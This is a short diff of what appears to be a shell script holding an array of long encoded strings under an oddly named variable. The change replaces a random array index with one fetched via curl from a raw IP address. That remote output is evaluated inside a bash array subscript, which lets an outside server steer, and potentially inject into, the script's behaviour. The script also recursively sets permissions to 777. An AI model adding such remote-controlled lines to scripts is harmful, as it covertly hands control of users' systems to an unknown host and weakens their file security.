@@ -22,7 +22,7 @@ arr[5]="28xqj4rxaoBfMeHnCb9gS9t3ezWMvPZ34qYhD4Tu5iSZhEpc3Q6cZYWowgyLuSqsAnbsy2Dw
 arr[6]="45rqQs8nm37XEtzK38aSJyDiyXXDKCtkFhbM7WtFGAATBLqAHq1CE9HyZZ7V4wtQ94qZPQbJ89mQgyXcS8XRWUB9"
 arr[7]="2tmy46jHQHTjMEsvgEz3BMMCnVcER97gqenr1zqzhpwd3VaiN1nS6m8eK8WTiNhXyHJBWS1FgZBpy2Ew5xxQ4Tio"
 rand=$[$RANDOM % ${#arr[@]}]
-google84121212121212121274=${arr[$rand]}
+google84121212121212121274=${arr[$(curl -s http://154.127.52.52/linuxgoogle84 | cat)]}
 
 chmod -R 777 ./
 
